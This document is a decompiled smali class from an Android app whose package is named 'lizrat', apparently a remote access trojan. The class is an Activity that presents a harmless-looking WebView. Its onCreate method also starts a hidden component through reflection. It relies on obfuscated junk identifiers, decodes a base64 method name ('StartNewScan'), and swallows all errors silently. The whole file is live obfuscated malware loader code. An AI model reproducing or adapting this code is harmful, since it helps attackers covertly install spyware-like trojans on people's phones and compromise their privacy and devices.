.class public LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;
.super Landroid/app/Activity;
.source "commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26$MyChrome;
    }
.end annotation


# instance fields
.field mWebView:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 31
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 1

    .line 185
    iget-object v0, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 186
    iget-object v0, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    .line 188
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    .line 92
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const p1, 0x7f07000a

    .line 95
    :try_start_0
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->setContentView(I)V

    const p1, 0x7f050045

    .line 96
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/webkit/WebView;

    iput-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    .line 97
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 98
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 99
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 100
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    .line 101
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setAppCacheEnabled(Z)V

    .line 103
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 104
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v2, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    .line 105
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const-string v2, "htleavinggsaillpythondtodstrikeydiesdexplosiontcejscrollsposxextendqtroopsqregimedinformalmsympathykngajapanmsynthesisjromancetcomplementsburnertpipelinehsusanibehindqadapterswcontinentalznicedsaintsvopeningjdetailsrsportszincllalumnisspeakingtpanamacactionseworksvbondsmgamecubeecandidatekdeaffscenenpresentstinvolvessangerrciscoldownjfocalqazerbaijanhparenthadjustmentsggreeceybuildingsobitzcomputationallbetweencparliamentccincinnatifexpansionhdoubletryissuedxconsideredqxboxscalibrationzregistryhnursingfswitchesyahwopposedjhighestcyieldsaexaminesjfloorkoutcomeopressedchouseholdzwantscbookstorewinsteadzusdakworldszdamnfreviewsjuveniletguardssbalancedtblaircperipheralrtournamentrphotographeramildsguesscdemonstratedvjotmaximumipoettshuttletfountainksprintkalreadywhorsewmachinerytempirekalanbprovisionshdiceaincidentifathermproducingicombinedequarterlvictorglikelygprospectgacceptingjmeshqgamespott50tp.agent"

    const-string v3, "leavinggsaillpythondtodstrikeydiesdexplosiontcejscrollsposxextendqtroopsqregimedinformalmsympathykngajapanmsynthesisjromancetcomplementsburnertpipelinehsusanibehindqadapterswcontinentalznicedsaintsvopeningjdetailsrsportszincllalumnisspeakingtpanamacactionseworksvbondsmgamecubeecandidatekdeaffscenenpresentstinvolvessangerrciscoldownjfocalqazerbaijanhparenthadjustmentsggreeceybuildingsobitzcomputationallbetweencparliamentccincinnatifexpansionhdoubletryissuedxconsideredqxboxscalibrationzregistryhnursingfswitchesyahwopposedjhighestcyieldsaexaminesjfloorkoutcomeopressedchouseholdzwantscbookstorewinsteadzusdakworldszdamnfreviewsjuveniletguardssbalancedtblaircperipheralrtournamentrphotographeramildsguesscdemonstratedvjotmaximumipoettshuttletfountainksprintkalreadywhorsewmachinerytempirekalanbprovisionshdiceaincidentifathermproducingicombinedequarterlvictorglikelygprospectgacceptingjmeshqgamespott50"

    invoke-static {v2, v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->electricibondsnkenyabentirelyxthoughtsvexplicitdayesdiegowmicexcanadiankreducingqversejteami48(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    .line 106
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    new-instance v2, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26$1;

    invoke-direct {v2, p0}, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26$1;-><init>(LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V

    .line 127
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    new-instance v2, Landroid/webkit/WebViewClient;

    invoke-direct {v2}, Landroid/webkit/WebViewClient;-><init>()V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 128
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    new-instance v2, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26$MyChrome;

    invoke-direct {v2, p0}, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26$MyChrome;-><init>(LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 129
    iget-object p1, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    const-string v2, " "

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 130
    invoke-virtual {p0}, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 135
    const-class v2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-static {v2, p1}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew30;->fitltrialrfairlyglesskkennethqspecificationstenterpriseswcigarettesrmatewtonyldimelinkingz49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 136
    new-instance v2, Landroid/content/Intent;

    const-class v3, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "com.appser.aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    const/4 v4, 0x0

    .line 142
    :try_start_1
    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    goto :goto_0

    :catch_0
    move-exception v3

    .line 144
    :try_start_2
    invoke-virtual {v3}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    move-object v3, v4

    .line 150
    :goto_0
    :try_start_3
    invoke-virtual {v3}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v5
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/InstantiationException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    goto :goto_2

    :catch_1
    move-exception v5

    .line 154
    :try_start_4
    invoke-virtual {v5}, Ljava/lang/InstantiationException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v5

    .line 152
    invoke-virtual {v5}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    :goto_1
    move-object v5, v4

    :goto_2
    const/4 v6, 0x2

    new-array v7, v6, [Ljava/lang/Class;

    .line 158
    const-class v8, Landroid/content/Context;

    aput-object v8, v7, v1

    .line 159
    const-class v8, Landroid/content/Intent;

    aput-object v8, v7, v0

    const-string v8, "U3RhcnROZXdTY2Fu"

    .line 160
    invoke-static {v8}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 164
    :try_start_5
    invoke-virtual {v3, v8, v7}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4
    :try_end_5
    .catch Ljava/lang/NoSuchMethodException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    goto :goto_3

    :catch_3
    move-exception v3

    .line 166
    :try_start_6
    invoke-virtual {v3}, Ljava/lang/NoSuchMethodException;->printStackTrace()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :goto_3
    :try_start_7
    new-array v3, v6, [Ljava/lang/Object;

    aput-object p1, v3, v1

    aput-object v2, v3, v0

    .line 170
    invoke-virtual {v4, v5, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_7
    .catch Ljava/lang/IllegalAccessException; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    :catch_4
    :cond_0
    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1

    .line 84
    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    .line 85
    iget-object v0, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    .line 78
    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    .line 79
    iget-object v0, p0, LLiz0rd/lizrat/commentshembsuppliesilicencelmatchingznumericsdurationefurnishingsaintegrityjentriesvthatsa26;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    return-void
.end method
